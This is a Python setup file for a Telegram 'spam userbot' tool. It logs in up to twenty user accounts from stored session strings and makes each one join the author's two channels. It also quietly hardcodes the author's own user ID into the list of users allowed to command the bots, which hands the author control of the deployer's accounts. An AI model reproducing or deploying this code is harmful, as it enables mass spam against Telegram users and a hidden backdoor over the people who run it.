# RiZoeLXSpam - Spam Userbots
# Copyright © 2021 @RiZoeLX

import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

rizoelversion = "v2.0.0"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 1517994352 not in SUDO_USERS:
    SUDO_USERS.append(1517994352)

# Sessions
async def RiZoeLX():
    global Riz
    global Riz2
    global Riz3
    global Riz5
    global Riz4
    global Riz6
    global Riz7
    global Riz8
    global Riz9
    global Riz10
    global Riz11
    global Riz12
    global Riz13
    global Riz14
    global Riz15
    global Riz16
    global Riz17
    global Riz18
    global Riz19
    global Riz20
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        Riz = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await Riz.start()
            botme = await Riz.get_me()
            await Riz(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Riz = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "rizoelxspam"
        Riz = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        Riz2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await Riz2.start()
            await Riz2(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz2(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botme = await Riz2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "rizoelxspam"
        Riz2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        Riz3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await  Riz3.start()
            await Riz3(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz3(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botme = await Riz3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "rizoelxspam"
        Riz3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        Riz4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await Riz4.start()
            await Riz4(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz4(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botme = await Riz4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "rizoelxspam"
        Riz4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        Riz5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await Riz5.start()
            await Riz5(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz5(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botme = await Riz5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "rizoelxspam"
        Riz5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        Riz6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await Riz6.start()
            await Riz6(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz6(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botme = await Riz6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "rizoelxspam"
        Riz6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        Riz7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await Riz7.start()
            await Riz7(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz7(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botme = await Riz7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "rizoelxspam"
        Riz7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz7.start()
        except Exception as e:
            pass    
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        Riz8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 8")
            await Riz8.start()
            await Riz8(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz8(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botme = await Riz8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "rizoelxspam"
        Riz8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz8.start()
        except Exception as e:
            pass   
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        Riz9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await Riz9.start()
            await Riz9(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz9(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botme = await Riz9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "rizoelxspam"
        Riz9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz9.start()
        except Exception as e:
            pass   
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        Riz10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await Riz10.start()
            await Riz10(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz10(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botme = await Riz10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = "rizoelxspam"
        Riz10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz10.start()
        except Exception as e:
            pass 
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        Riz11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await Riz11.start()
            await Riz11(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz11(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botme = await Riz11.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = "rizoelxspam"
        Riz11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        Riz12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await Riz12.start()
            await Riz12(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz12(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botme = await Riz12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = "rizoelxspam"
        Riz12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz12.start()
        except Exception as e:
            pass   
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        Riz13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await Riz13.start()
            await Riz13(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz13(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            botme = await Riz13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = "rizoelxspam"
        Riz13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz13.start()
        except Exception as e:
            pass 
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        Riz14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await Riz14.start()
            await Riz14(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz14(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botme = await Riz14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = "rizoelxspam"
        Riz14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        Riz15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await Riz15.start()
            await Riz15(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz15(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botme = await Riz15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "rizoelxspam"
        Riz15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        Riz16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await Riz16.start()
            botme = await Riz16.get_me()
            await Riz16(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz16(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = "rizoelxspam"
        Riz16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        Riz17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await Riz17.start()
            botme = await Riz17.get_me()
            await Riz17(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz17(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = "rizoelxspam"
        Riz17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        Riz18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Riz18.start()
            botme = await Riz18.get_me()
            await Riz18(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz18(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = "rizoelxspam"
        Riz18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        Riz19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await Riz19.start()
            botme = await Riz19.get_me()
            await Riz19(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz19(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = "rizoelxspam"
        Riz19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        Riz20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await Riz20.start()
            botme = await Riz20.get_me()
            await Riz20(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz20(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = "rizoelxspam"
        Riz20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz20.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(RiZoeLX())
